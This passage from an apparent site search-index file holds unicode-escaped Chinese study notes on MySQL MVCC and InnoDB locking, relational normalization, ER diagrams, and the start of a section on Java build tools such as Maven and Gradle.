TRX_IDs \u5217\u8868\u4E2D\uFF0C\u8868\u793A\u8BE5\u6570\u636E\u884C\u5FEB\u7167\u5BF9\u5E94\u7684\u4E8B\u52A1\u8FD8\u672A\u63D0\u4EA4\uFF0C\u5219\u8BE5\u5FEB\u7167\u4E0D\u53EF\u4F7F\u7528\u3002\u5426\u5219\u8868\u793A\u5DF2\u7ECF\u63D0\u4EA4\uFF0C\u53EF\u4EE5\u4F7F\u7528\u3002
\u53EF\u91CD\u590D\u8BFB\uFF1A\u90FD\u4E0D\u53EF\u4EE5\u4F7F\u7528\u3002\u56E0\u4E3A\u5982\u679C\u53EF\u4EE5\u4F7F\u7528\u7684\u8BDD\uFF0C\u90A3\u4E48\u5176\u5B83\u4E8B\u52A1\u4E5F\u53EF\u4EE5\u8BFB\u5230\u8FD9\u4E2A\u6570\u636E\u884C\u5FEB\u7167\u5E76\u8FDB\u884C\u4FEE\u6539\uFF0C\u90A3\u4E48\u5F53\u524D\u4E8B\u52A1\u518D\u53BB\u8BFB\u8FD9\u4E2A\u6570\u636E\u884C\u5F97\u5230\u7684\u503C\u5C31\u4F1A\u53D1\u751F\u6539\u53D8\uFF0C\u4E5F\u5C31\u662F\u51FA\u73B0\u4E86\u4E0D\u53EF\u91CD\u590D\u8BFB\u95EE\u9898\u3002 \u5728\u6570\u636E\u884C\u5FEB\u7167\u4E0D\u53EF\u4F7F\u7528\u7684\u60C5\u51B5\u4E0B\uFF0C\u9700\u8981\u6CBF\u7740 Undo Log \u7684\u56DE\u6EDA\u6307\u9488 ROLL_PTR \u627E\u5230\u4E0B\u4E00\u4E2A\u5FEB\u7167\uFF0C\u518D\u8FDB\u884C\u4E0A\u9762\u7684\u5224\u65AD\u3002`},{header:"\u5FEB\u7167\u8BFB\u4E0E\u5F53\u524D\u8BFB",slug:"\u5FEB\u7167\u8BFB\u4E0E\u5F53\u524D\u8BFB",content:""},{header:"1. \u5FEB\u7167\u8BFB",slug:"_1-\u5FEB\u7167\u8BFB",content:`MVCC \u7684 SELECT \u64CD\u4F5C\u662F\u5FEB\u7167\u4E2D\u7684\u6570\u636E\uFF0C\u4E0D\u9700\u8981\u8FDB\u884C\u52A0\u9501\u64CD\u4F5C\u3002
SELECT * FROM table ...;`},{header:"2. \u5F53\u524D\u8BFB",slug:"_2-\u5F53\u524D\u8BFB",content:`MVCC \u5176\u5B83\u4F1A\u5BF9\u6570\u636E\u5E93\u8FDB\u884C\u4FEE\u6539\u7684\u64CD\u4F5C\uFF08INSERT\u3001UPDATE\u3001DELETE\uFF09\u9700\u8981\u8FDB\u884C\u52A0\u9501\u64CD\u4F5C\uFF0C\u4ECE\u800C\u8BFB\u53D6\u6700\u65B0\u7684\u6570\u636E\u3002\u53EF\u4EE5\u770B\u5230 MVCC \u5E76\u4E0D\u662F\u5B8C\u5168\u4E0D\u7528\u52A0\u9501\uFF0C\u800C\u53EA\u662F\u907F\u514D\u4E86 SELECT \u7684\u52A0\u9501\u64CD\u4F5C\u3002
INSERT;
UPDATE;
DELETE;
\u5728\u8FDB\u884C SELECT \u64CD\u4F5C\u65F6\uFF0C\u53EF\u4EE5\u5F3A\u5236\u6307\u5B9A\u8FDB\u884C\u52A0\u9501\u64CD\u4F5C\u3002\u4EE5\u4E0B\u7B2C\u4E00\u4E2A\u8BED\u53E5\u9700\u8981\u52A0 S \u9501\uFF0C\u7B2C\u4E8C\u4E2A\u9700\u8981\u52A0 X \u9501\u3002
SELECT * FROM table WHERE ? lock in share mode;
SELECT * FROM table WHERE ? for update;`},{header:"\u516D\u3001Next-Key Locks",slug:"\u516D\u3001next-key-locks",content:`Next-Key Locks \u662F MySQL \u7684 InnoDB \u5B58\u50A8\u5F15\u64CE\u7684\u4E00\u79CD\u9501\u5B9E\u73B0\u3002
MVCC \u4E0D\u80FD\u89E3\u51B3\u5E7B\u5F71\u8BFB\u95EE\u9898\uFF0CNext-Key Locks \u5C31\u662F\u4E3A\u4E86\u89E3\u51B3\u8FD9\u4E2A\u95EE\u9898\u800C\u5B58\u5728\u7684\u3002\u5728\u53EF\u91CD\u590D\u8BFB\uFF08REPEATABLE READ\uFF09\u9694\u79BB\u7EA7\u522B\u4E0B\uFF0C\u4F7F\u7528 MVCC + Next-Key Locks \u53EF\u4EE5\u89E3\u51B3\u5E7B\u8BFB\u95EE\u9898\u3002`},{header:"Record Locks",slug:"record-locks",content:`\u9501\u5B9A\u4E00\u4E2A\u8BB0\u5F55\u4E0A\u7684\u7D22\u5F15\uFF0C\u800C\u4E0D\u662F\u8BB0\u5F55\u672C\u8EAB\u3002
\u5982\u679C\u8868\u6CA1\u6709\u8BBE\u7F6E\u7D22\u5F15\uFF0CInnoDB \u4F1A\u81EA\u52A8\u5728\u4E3B\u952E\u4E0A\u521B\u5EFA\u9690\u85CF\u7684\u805A\u7C07\u7D22\u5F15\uFF0C\u56E0\u6B64 Record Locks \u4F9D\u7136\u53EF\u4EE5\u4F7F\u7528\u3002`},{header:"Gap Locks",slug:"gap-locks",content:`\u9501\u5B9A\u7D22\u5F15\u4E4B\u95F4\u7684\u95F4\u9699\uFF0C\u4F46\u662F\u4E0D\u5305\u542B\u7D22\u5F15\u672C\u8EAB\u3002\u4F8B\u5982\u5F53\u4E00\u4E2A\u4E8B\u52A1\u6267\u884C\u4EE5\u4E0B\u8BED\u53E5\uFF0C\u5176\u5B83\u4E8B\u52A1\u5C31\u4E0D\u80FD\u5728 t.c \u4E2D\u63D2\u5165 15\u3002
SELECT c FROM t WHERE c BETWEEN 10 and 20 FOR UPDATE;`},{header:"Next-Key Locks",slug:"next-key-locks",content:`\u5B83\u662F Record Locks \u548C Gap Locks \u7684\u7ED3\u5408\uFF0C\u4E0D\u4EC5\u9501\u5B9A\u4E00\u4E2A\u8BB0\u5F55\u4E0A\u7684\u7D22\u5F15\uFF0C\u4E5F\u9501\u5B9A\u7D22\u5F15\u4E4B\u95F4\u7684\u95F4\u9699\u3002\u5B83\u9501\u5B9A\u4E00\u4E2A\u524D\u5F00\u540E\u95ED\u533A\u95F4\uFF0C\u4F8B\u5982\u4E00\u4E2A\u7D22\u5F15\u5305\u542B\u4EE5\u4E0B\u503C\uFF1A10, 11, 13, and 20\uFF0C\u90A3\u4E48\u5C31\u9700\u8981\u9501\u5B9A\u4EE5\u4E0B\u533A\u95F4\uFF1A
(-\u221E, 10]
(10, 11]
(11, 13]
(13, 20]
(20, +\u221E)`},{header:"\u4E03\u3001\u5173\u7CFB\u6570\u636E\u5E93\u8BBE\u8BA1\u7406\u8BBA",slug:"\u4E03\u3001\u5173\u7CFB\u6570\u636E\u5E93\u8BBE\u8BA1\u7406\u8BBA",content:""},{header:"\u51FD\u6570\u4F9D\u8D56",slug:"\u51FD\u6570\u4F9D\u8D56",content:`\u8BB0 A->B \u8868\u793A A \u51FD\u6570\u51B3\u5B9A B\uFF0C\u4E5F\u53EF\u4EE5\u8BF4 B \u51FD\u6570\u4F9D\u8D56\u4E8E A\u3002
\u5982\u679C {A1\uFF0CA2\uFF0C... \uFF0CAn} \u662F\u5173\u7CFB\u7684\u4E00\u4E2A\u6216\u591A\u4E2A\u5C5E\u6027\u7684\u96C6\u5408\uFF0C\u8BE5\u96C6\u5408\u51FD\u6570\u51B3\u5B9A\u4E86\u5173\u7CFB\u7684\u5176\u5B83\u6240\u6709\u5C5E\u6027\u5E76\u4E14\u662F\u6700\u5C0F\u7684\uFF0C\u90A3\u4E48\u8BE5\u96C6\u5408\u5C31\u79F0\u4E3A\u952E\u7801\u3002
\u5BF9\u4E8E A->B\uFF0C\u5982\u679C\u80FD\u627E\u5230 A \u7684\u771F\u5B50\u96C6 A'\uFF0C\u4F7F\u5F97 A'-> B\uFF0C\u90A3\u4E48 A->B \u5C31\u662F\u90E8\u5206\u51FD\u6570\u4F9D\u8D56\uFF0C\u5426\u5219\u5C31\u662F\u5B8C\u5168\u51FD\u6570\u4F9D\u8D56\u3002
\u5BF9\u4E8E A->B\uFF0CB->C\uFF0C\u5219 A->C \u662F\u4E00\u4E2A\u4F20\u9012\u51FD\u6570\u4F9D\u8D56\u3002`},{header:"\u5F02\u5E38",slug:"\u5F02\u5E38",content:`\u4EE5\u4E0B\u7684\u5B66\u751F\u8BFE\u7A0B\u5173\u7CFB\u7684\u51FD\u6570\u4F9D\u8D56\u4E3A {Sno, Cname} -> {Sname, Sdept, Mname, Grade}\uFF0C\u952E\u7801\u4E3A {Sno, Cname}\u3002\u4E5F\u5C31\u662F\u8BF4\uFF0C\u786E\u5B9A\u5B66\u751F\u548C\u8BFE\u7A0B\u4E4B\u540E\uFF0C\u5C31\u80FD\u786E\u5B9A\u5176\u5B83\u4FE1\u606F\u3002 Sno
Sname
Sdept
Mname
Cname
Grade 1
\u5B66\u751F-1
\u5B66\u9662-1
\u9662\u957F-1
\u8BFE\u7A0B-1
90 2
\u5B66\u751F-2
\u5B66\u9662-2
\u9662\u957F-2
\u8BFE\u7A0B-2
80 2
\u5B66\u751F-2
\u5B66\u9662-2
\u9662\u957F-2
\u8BFE\u7A0B-1
100 3
\u5B66\u751F-3
\u5B66\u9662-2
\u9662\u957F-2
\u8BFE\u7A0B-2
95 \u4E0D\u7B26\u5408\u8303\u5F0F\u7684\u5173\u7CFB\uFF0C\u4F1A\u4EA7\u751F\u5F88\u591A\u5F02\u5E38\uFF0C\u4E3B\u8981\u6709\u4EE5\u4E0B\u56DB\u79CD\u5F02\u5E38\uFF1A \u5197\u4F59\u6570\u636E\uFF1A\u4F8B\u5982 \u5B66\u751F-2 \u51FA\u73B0\u4E86\u4E24\u6B21\u3002
\u4FEE\u6539\u5F02\u5E38\uFF1A\u4FEE\u6539\u4E86\u4E00\u4E2A\u8BB0\u5F55\u4E2D\u7684\u4FE1\u606F\uFF0C\u4F46\u662F\u53E6\u4E00\u4E2A\u8BB0\u5F55\u4E2D\u76F8\u540C\u7684\u4FE1\u606F\u5374\u6CA1\u6709\u88AB\u4FEE\u6539\u3002
\u5220\u9664\u5F02\u5E38\uFF1A\u5220\u9664\u4E00\u4E2A\u4FE1\u606F\uFF0C\u90A3\u4E48\u4E5F\u4F1A\u4E22\u5931\u5176\u5B83\u4FE1\u606F\u3002\u4F8B\u5982\u5220\u9664\u4E86 \u8BFE\u7A0B-1 \u9700\u8981\u5220\u9664\u7B2C\u4E00\u884C\u548C\u7B2C\u4E09\u884C\uFF0C\u90A3\u4E48 \u5B66\u751F-1 \u7684\u4FE1\u606F\u5C31\u4F1A\u4E22\u5931\u3002
\u63D2\u5165\u5F02\u5E38\uFF1A\u4F8B\u5982\u60F3\u8981\u63D2\u5165\u4E00\u4E2A\u5B66\u751F\u7684\u4FE1\u606F\uFF0C\u5982\u679C\u8FD9\u4E2A\u5B66\u751F\u8FD8\u6CA1\u9009\u8BFE\uFF0C\u90A3\u4E48\u5C31\u65E0\u6CD5\u63D2\u5165\u3002`},{header:"\u8303\u5F0F",slug:"\u8303\u5F0F",content:`\u8303\u5F0F\u7406\u8BBA\u662F\u4E3A\u4E86\u89E3\u51B3\u4EE5\u4E0A\u63D0\u5230\u56DB\u79CD\u5F02\u5E38\u3002
\u9AD8\u7EA7\u522B\u8303\u5F0F\u7684\u4F9D\u8D56\u4E8E\u4F4E\u7EA7\u522B\u7684\u8303\u5F0F\uFF0C1NF \u662F\u6700\u4F4E\u7EA7\u522B\u7684\u8303\u5F0F\u3002`},{header:"1. \u7B2C\u4E00\u8303\u5F0F (1NF)",slug:"_1-\u7B2C\u4E00\u8303\u5F0F-1nf",content:"\u5C5E\u6027\u4E0D\u53EF\u5206\u3002"},{header:"2. \u7B2C\u4E8C\u8303\u5F0F (2NF)",slug:"_2-\u7B2C\u4E8C\u8303\u5F0F-2nf",content:`\u6BCF\u4E2A\u975E\u4E3B\u5C5E\u6027\u5B8C\u5168\u51FD\u6570\u4F9D\u8D56\u4E8E\u952E\u7801\u3002
\u53EF\u4EE5\u901A\u8FC7\u5206\u89E3\u6765\u6EE1\u8DB3\u3002
\u5206\u89E3\u524D Sno
Sname
Sdept
Mname
Cname
Grade 1
\u5B66\u751F-1
\u5B66\u9662-1
\u9662\u957F-1
\u8BFE\u7A0B-1
90 2
\u5B66\u751F-2
\u5B66\u9662-2
\u9662\u957F-2
\u8BFE\u7A0B-2
80 2
\u5B66\u751F-2
\u5B66\u9662-2
\u9662\u957F-2
\u8BFE\u7A0B-1
100 3
\u5B66\u751F-3
\u5B66\u9662-2
\u9662\u957F-2
\u8BFE\u7A0B-2
95 \u4EE5\u4E0A\u5B66\u751F\u8BFE\u7A0B\u5173\u7CFB\u4E2D\uFF0C{Sno, Cname} \u4E3A\u952E\u7801\uFF0C\u6709\u5982\u4E0B\u51FD\u6570\u4F9D\u8D56\uFF1A Sno -> Sname, Sdept
Sdept -> Mname
Sno, Cname-> Grade Grade \u5B8C\u5168\u51FD\u6570\u4F9D\u8D56\u4E8E\u952E\u7801\uFF0C\u5B83\u6CA1\u6709\u4EFB\u4F55\u5197\u4F59\u6570\u636E\uFF0C\u6BCF\u4E2A\u5B66\u751F\u7684\u6BCF\u95E8\u8BFE\u90FD\u6709\u7279\u5B9A\u7684\u6210\u7EE9\u3002
Sname, Sdept \u548C Mname \u90FD\u90E8\u5206\u4F9D\u8D56\u4E8E\u952E\u7801\uFF0C\u5F53\u4E00\u4E2A\u5B66\u751F\u9009\u4FEE\u4E86\u591A\u95E8\u8BFE\u65F6\uFF0C\u8FD9\u4E9B\u6570\u636E\u5C31\u4F1A\u51FA\u73B0\u591A\u6B21\uFF0C\u9020\u6210\u5927\u91CF\u5197\u4F59\u6570\u636E\u3002
\u5206\u89E3\u540E
\u5173\u7CFB-1 Sno
Sname
Sdept
Mname 1
\u5B66\u751F-1
\u5B66\u9662-1
\u9662\u957F-1 2
\u5B66\u751F-2
\u5B66\u9662-2
\u9662\u957F-2 3
\u5B66\u751F-3
\u5B66\u9662-2
\u9662\u957F-2 \u6709\u4EE5\u4E0B\u51FD\u6570\u4F9D\u8D56\uFF1A Sno -> Sname, Sdept
Sdept -> Mname \u5173\u7CFB-2 Sno
Cname
Grade 1
\u8BFE\u7A0B-1
90 2
\u8BFE\u7A0B-2
80 2
\u8BFE\u7A0B-1
100 3
\u8BFE\u7A0B-2
95 \u6709\u4EE5\u4E0B\u51FD\u6570\u4F9D\u8D56\uFF1A Sno, Cname -> Grade`},{header:"3. \u7B2C\u4E09\u8303\u5F0F (3NF)",slug:"_3-\u7B2C\u4E09\u8303\u5F0F-3nf",content:`\u975E\u4E3B\u5C5E\u6027\u4E0D\u4F20\u9012\u51FD\u6570\u4F9D\u8D56\u4E8E\u952E\u7801\u3002
\u4E0A\u9762\u7684 \u5173\u7CFB-1 \u4E2D\u5B58\u5728\u4EE5\u4E0B\u4F20\u9012\u51FD\u6570\u4F9D\u8D56\uFF1A Sno -> Sdept -> Mname \u53EF\u4EE5\u8FDB\u884C\u4EE5\u4E0B\u5206\u89E3\uFF1A
\u5173\u7CFB-11 Sno
Sname
Sdept 1
\u5B66\u751F-1
\u5B66\u9662-1 2
\u5B66\u751F-2
\u5B66\u9662-2 3
\u5B66\u751F-3
\u5B66\u9662-2 \u5173\u7CFB-12 Sdept
Mname \u5B66\u9662-1
\u9662\u957F-1 \u5B66\u9662-2
\u9662\u957F-2`},{header:"\u516B\u3001ER \u56FE",slug:"\u516B\u3001er-\u56FE",content:`Entity-Relationship\uFF0C\u6709\u4E09\u4E2A\u7EC4\u6210\u90E8\u5206\uFF1A\u5B9E\u4F53\u3001\u5C5E\u6027\u3001\u8054\u7CFB\u3002
\u7528\u6765\u8FDB\u884C\u5173\u7CFB\u578B\u6570\u636E\u5E93\u7CFB\u7EDF\u7684\u6982\u5FF5\u8BBE\u8BA1\u3002`},{header:"\u5B9E\u4F53\u7684\u4E09\u79CD\u8054\u7CFB",slug:"\u5B9E\u4F53\u7684\u4E09\u79CD\u8054\u7CFB",content:`\u5305\u542B\u4E00\u5BF9\u4E00\uFF0C\u4E00\u5BF9\u591A\uFF0C\u591A\u5BF9\u591A\u4E09\u79CD\u3002 \u5982\u679C A \u5230 B \u662F\u4E00\u5BF9\u591A\u5173\u7CFB\uFF0C\u90A3\u4E48\u753B\u4E2A\u5E26\u7BAD\u5934\u7684\u7EBF\u6BB5\u6307\u5411 B\uFF1B
\u5982\u679C\u662F\u4E00\u5BF9\u4E00\uFF0C\u753B\u4E24\u4E2A\u5E26\u7BAD\u5934\u7684\u7EBF\u6BB5\uFF1B
\u5982\u679C\u662F\u591A\u5BF9\u591A\uFF0C\u753B\u4E24\u4E2A\u4E0D\u5E26\u7BAD\u5934\u7684\u7EBF\u6BB5\u3002 \u4E0B\u56FE\u7684 Course \u548C Student \u662F\u4E00\u5BF9\u591A\u7684\u5173\u7CFB\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1d28ad05-39e5-49a2-a6a1-a6f496adba6a.png" width="380px)`},{header:"\u8868\u793A\u51FA\u73B0\u591A\u6B21\u7684\u5173\u7CFB",slug:"\u8868\u793A\u51FA\u73B0\u591A\u6B21\u7684\u5173\u7CFB",content:`\u4E00\u4E2A\u5B9E\u4F53\u5728\u8054\u7CFB\u51FA\u73B0\u51E0\u6B21\uFF0C\u5C31\u8981\u7528\u51E0\u6761\u7EBF\u8FDE\u63A5\u3002
\u4E0B\u56FE\u8868\u793A\u4E00\u4E2A\u8BFE\u7A0B\u7684\u5148\u4FEE\u5173\u7CFB\uFF0C\u5148\u4FEE\u5173\u7CFB\u51FA\u73B0\u4E24\u4E2A Course \u5B9E\u4F53\uFF0C\u7B2C\u4E00\u4E2A\u662F\u5148\u4FEE\u8BFE\u7A0B\uFF0C\u540E\u4E00\u4E2A\u662F\u540E\u4FEE\u8BFE\u7A0B\uFF0C\u56E0\u6B64\u9700\u8981\u7528\u4E24\u6761\u7EBF\u6765\u8868\u793A\u8FD9\u79CD\u5173\u7CFB\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ac929ea3-daca-40ec-9e95-4b2fa6678243.png" width="250px)`},{header:"\u8054\u7CFB\u7684\u591A\u5411\u6027",slug:"\u8054\u7CFB\u7684\u591A\u5411\u6027",content:`\u867D\u7136\u8001\u5E08\u53EF\u4EE5\u5F00\u8BBE\u591A\u95E8\u8BFE\uFF0C\u5E76\u4E14\u53EF\u4EE5\u6559\u6388\u591A\u540D\u5B66\u751F\uFF0C\u4F46\u662F\u5BF9\u4E8E\u7279\u5B9A\u7684\u5B66\u751F\u548C\u8BFE\u7A0B\uFF0C\u53EA\u6709\u4E00\u4E2A\u8001\u5E08\u6559\u6388\uFF0C\u8FD9\u5C31\u6784\u6210\u4E86\u4E00\u4E2A\u4E09\u5143\u8054\u7CFB\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5bb1b38a-527e-4802-a385-267dadbd30ba.png" width="350px)`},{header:"\u8868\u793A\u5B50\u7C7B",slug:"\u8868\u793A\u5B50\u7C7B",content:`\u7528\u4E00\u4E2A\u4E09\u89D2\u5F62\u548C\u4E24\u6761\u7EBF\u6765\u8FDE\u63A5\u7C7B\u548C\u5B50\u7C7B\uFF0C\u4E0E\u5B50\u7C7B\u6709\u5173\u7684\u5C5E\u6027\u548C\u8054\u7CFB\u90FD\u8FDE\u5230\u5B50\u7C7B\u4E0A\uFF0C\u800C\u4E0E\u7236\u7C7B\u548C\u5B50\u7C7B\u90FD\u6709\u5173\u7684\u8FDE\u5230\u7236\u7C7B\u4E0A\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/14389ea4-8d96-4e96-9f76-564ca3324c1e.png" width="450px)`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`AbrahamSilberschatz, HenryF.Korth, S.Sudarshan, \u7B49. \u6570\u636E\u5E93\u7CFB\u7EDF\u6982\u5FF5 [M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2006.
\u65BD\u74E6\u8328. \u9AD8\u6027\u80FD MYSQL\u7B2C3\u7248. \u7535\u5B50\u5DE5\u4E1A\u51FA\u7248\u793E, 2013.
\u53F2\u5609\u6743. \u6570\u636E\u5E93\u7CFB\u7EDF\u6982\u8BBA[M]. \u6E05\u534E\u5927\u5B66\u51FA\u7248\u793E\u6709\u9650\u516C\u53F8, 2006.
The InnoDB Storage Engine
Transaction isolation levels
Concurrency Control
The Nightmare of Locking, Blocking and Isolation Levels!
Database Normalization and Normal Forms with an Example
The basics of the InnoDB undo logging and history system
MySQL locking for the busy web developer
\u6D45\u5165\u6D45\u51FA MySQL \u548C InnoDB
Innodb \u4E2D\u7684\u4E8B\u52A1\u9694\u79BB\u7EA7\u522B\u548C\u9501\u7684\u5173\u7CFB`}]},{path:"/java/%E6%9E%84%E5%BB%BA%E5%B7%A5%E5%85%B7.html",title:"\u6784\u5EFA\u5DE5\u5177",pathLocale:"/",contents:[{header:"\u6784\u5EFA\u5DE5\u5177",slug:"\u6784\u5EFA\u5DE5\u5177",content:`\u6784\u5EFA\u5DE5\u5177 \u4E00\u3001\u6784\u5EFA\u5DE5\u5177\u7684\u4F5C\u7528
\u4E8C\u3001Java \u4E3B\u6D41\u6784\u5EFA\u5DE5\u5177
\u4E09\u3001Maven
\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6784\u5EFA\u5DE5\u5177\u7684\u4F5C\u7528",slug:"\u4E00\u3001\u6784\u5EFA\u5DE5\u5177\u7684\u4F5C\u7528",content:`\u6784\u5EFA\u4E00\u4E2A\u9879\u76EE\u901A\u5E38\u5305\u542B\u4E86\u4F9D\u8D56\u7BA1\u7406\u3001\u6D4B\u8BD5\u3001\u7F16\u8BD1\u3001\u6253\u5305\u3001\u53D1\u5E03\u7B49\u6D41\u7A0B\uFF0C\u6784\u5EFA\u5DE5\u5177\u53EF\u4EE5\u81EA\u52A8\u5316\u8FDB\u884C\u8FD9\u4E9B\u64CD\u4F5C\uFF0C\u4ECE\u800C\u4E3A\u6211\u4EEC\u51CF\u5C11\u8FD9\u4E9B\u7E41\u7410\u7684\u5DE5\u4F5C\u3002
\u5176\u4E2D\u6784\u5EFA\u5DE5\u5177\u63D0\u4F9B\u7684\u4F9D\u8D56\u7BA1\u7406\u80FD\u591F\u53EF\u4EE5\u81EA\u52A8\u5904\u7406\u4F9D\u8D56\u5173\u7CFB\u3002\u4F8B\u5982\u4E00\u4E2A\u9879\u76EE\u9700\u8981\u7528\u5230\u4F9D\u8D56 A\uFF0CA \u53C8\u4F9D\u8D56\u4E8E B\uFF0C\u90A3\u4E48\u6784\u5EFA\u5DE5\u5177\u5C31\u80FD\u5E2E\u6211\u4EEC\u5BFC\u5165 B\uFF0C\u800C\u4E0D\u9700\u8981\u6211\u4EEC\u624B\u52A8\u53BB\u5BFB\u627E\u5E76\u5BFC\u5165\u3002
\u5728 Java \u9879\u76EE\u4E2D\uFF0C\u6253\u5305\u6D41\u7A0B\u901A\u5E38\u662F\u5C06\u9879\u76EE\u6253\u5305\u6210 Jar \u5305\u3002\u5728\u6CA1\u6709\u6784\u5EFA\u5DE5\u5177\u7684\u60C5\u51B5\u4E0B\uFF0C\u6211\u4EEC\u9700\u8981\u4F7F\u7528\u547D\u4EE4\u884C\u5DE5\u5177\u6216\u8005 IDE \u624B\u52A8\u6253\u5305\u3002\u800C\u53D1\u5E03\u6D41\u7A0B\u901A\u5E38\u662F\u5C06 Jar \u5305\u4E0A\u4F20\u5230\u670D\u52A1\u5668\u4E0A\u3002`},{header:"\u4E8C\u3001Java \u4E3B\u6D41\u6784\u5EFA\u5DE5\u5177",slug:"\u4E8C\u3001java-\u4E3B\u6D41\u6784\u5EFA\u5DE5\u5177",content:`Ant \u5177\u6709\u7F16\u8BD1\u3001\u6D4B\u8BD5\u548C\u6253\u5305\u529F\u80FD\uFF0C\u5176\u540E\u51FA\u73B0\u7684 Maven \u5728 Ant \u7684\u529F\u80FD\u57FA\u7840\u4E0A\u53C8\u65B0\u589E\u4E86\u4F9D\u8D56\u7BA1\u7406\u529F\u80FD\uFF0C\u800C\u6700\u65B0\u7684 Gradle \u53C8\u5728 Maven \u7684\u529F\u80FD\u57FA\u7840\u4E0A\u65B0\u589E\u4E86\u5BF9 Groovy \u8BED\u8A00\u7684\u652F\u6301\u3002 Gradle \u548C Maven \u7684\u533A\u522B\u662F\uFF0C\u5B83\u4F7F\u7528 Groovy \u8FD9\u79CD\u7279\u5B9A\u9886\u57DF\u8BED\u8A00\uFF08DSL\uFF09\u6765\u7BA1\u7406\u6784\u5EFA\u811A\u672C\uFF0C\u800C\u4E0D\u518D\u4F7F\u7528 XML \u8FD9\u79CD\u6807\u8BB0\u6027\u8BED\u8A00\u3002\u56E0\u4E3A\u9879\u76EE\u5982\u679C\u5E9E\u5927\u7684\u8BDD\uFF0CXML \u5F88\u5BB9\u6613\u5C31\u53D8\u5F97\u81C3\u80BF\u3002
\u4F8B\u5982\u8981\u5728\u9879\u76EE\u4E2D\u5F15\u5165 Junit\uFF0CMaven \u7684\u4EE3\u7801\u5982\u4E0B\uFF1A
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"> <modelVersion>4.0.0</modelVersion> <groupId>jizg.study.maven.hello</groupId> <artifactId>hello-first</artifactId> <version>0.0.1-SNAPSHOT</version> <dependencies> <dependency> <groupId>junit</groupId> <artifactId>junit</artifactId> <version>4.10</version> <scope>test</scope> </dependency> </dependencies>
</project>
\u800C Gradle \u53EA\u9700\u8981\u51E0\u884C\u4EE3\u7801\uFF1A
dependencies { testCompile "junit:junit:4.10"
}`},{header:"\u4E09\u3001Maven",slug:"\u4E09\u3001maven",content:""},{header:"\u6982\u8FF0",slug:"\u6982\u8FF0",content:"\u63D0\u4F9B\u4E86\u9879\u76EE\u5BF9\u8C61\u6A21\u578B\uFF08POM\uFF09\u6587\u4EF6\u6765\u7BA1\u7406\u9879\u76EE\u7684\u6784\u5EFA\u3002"},{header:"\u4ED3\u5E93",slug:"\u4ED3\u5E93",content:`\u4ED3\u5E93\u7684\u641C\u7D22\u987A\u5E8F\u4E3A\uFF1A\u672C\u5730\u4ED3\u5E93\u3001\u4E2D\u592E\u4ED3\u5E93\u3001\u8FDC\u7A0B\u4ED3\u5E93\u3002 \u672C\u5730\u4ED3\u5E93\u7528\u6765\u5B58\u50A8\u9879\u76EE\u7684\u4F9D\u8D56\u5E93\uFF1B
\u4E2D\u592E\u4ED3\u5E93\u662F\u4E0B\u8F7D\u4F9D\u8D56\u5E93\u7684\u9ED8\u8BA4\u4F4D\u7F6E\uFF1B
\u8FDC\u7A0B\u4ED3\u5E93\uFF0C\u56E0\u4E3A\u5E76\u975E\u6240\u6709\u7684\u4F9D\u8D56\u5E93\u90FD\u5728\u4E2D\u592E\u4ED3\u5E93\uFF0C\u6216\u8005\u4E2D\u592E\u4ED3\u5E93\u8BBF\u95EE\u901F\u5EA6\u5F88\u6162\uFF0C\u8FDC\u7A0B\u4ED3\u5E93\u662F\u4E2D\u592E\u4ED3\u5E93\u7684\u8865\u5145\u3002`},{header:"POM",slug:"pom",content:`POM \u4EE3\u8868\u9879\u76EE\u5BF9\u8C61\u6A21\u578B\uFF0C\u5B83\u662F\u4E00\u4E2A XML \u6587\u4EF6\uFF0C\u4FDD\u5B58\u5728\u9879\u76EE\u6839\u76EE\u5F55\u7684 pom.xml \u6587\u4EF6\u4E2D\u3002
<dependency> <groupId>junit</groupId> <artifactId>junit</artifactId> <version>4.12</version> <scope>test</scope>
</dependency>
[groupId, artifactId, version, packaging, classifier] \u79F0\u4E3A\u4E00\u4E2A\u9879\u76EE\u7684\u5750\u6807\uFF0C\u5176\u4E2D groupId\u3001artifactId\u3001version \u5FC5\u987B\u5B9A\u4E49\uFF0Cpackaging \u53EF\u9009\uFF08\u9ED8\u8BA4\u4E3A Jar\uFF09\uFF0Cclassifier \u4E0D\u80FD\u76F4\u63A5\u5B9A\u4E49\u7684\uFF0C\u9700\u8981\u7ED3\u5408\u63D2\u4EF6\u4F7F\u7528\u3002 groupId\uFF1A\u9879\u76EE\u7EC4 Id\uFF0C\u5FC5\u987B\u5168\u7403\u552F\u4E00\uFF1B
artifactId\uFF1A\u9879\u76EE Id\uFF0C\u5373\u9879\u76EE\u540D\uFF1B
version\uFF1A\u9879\u76EE\u7248\u672C\uFF1B
packaging\uFF1A\u9879\u76EE\u6253\u5305\u65B9\u5F0F\u3002`},{header:"\u4F9D\u8D56\u539F\u5219",slug:"\u4F9D\u8D56\u539F\u5219",content:""},{header:"1. \u4F9D\u8D56\u8DEF\u5F84\u6700\u77ED\u4F18\u5148\u539F\u5219",slug:"_1-\u4F9D\u8D56\u8DEF\u5F84\u6700\u77ED\u4F18\u5148\u539F\u5219",content:`A -> B -> C -> X(1.0)
A -> D -> X(2.0)
\u7531\u4E8E X(2.0) \u8DEF\u5F84\u6700\u77ED\uFF0C\u6240\u4EE5\u4F7F\u7528 X(2.0)\u3002`},{header:"2. \u58F0\u660E\u987A\u5E8F\u4F18\u5148\u539F\u5219",slug:"_2-\u58F0\u660E\u987A\u5E8F\u4F18\u5148\u539F\u5219",content:`A -> B -> X(1.0)
A -> C -> X(2.0)
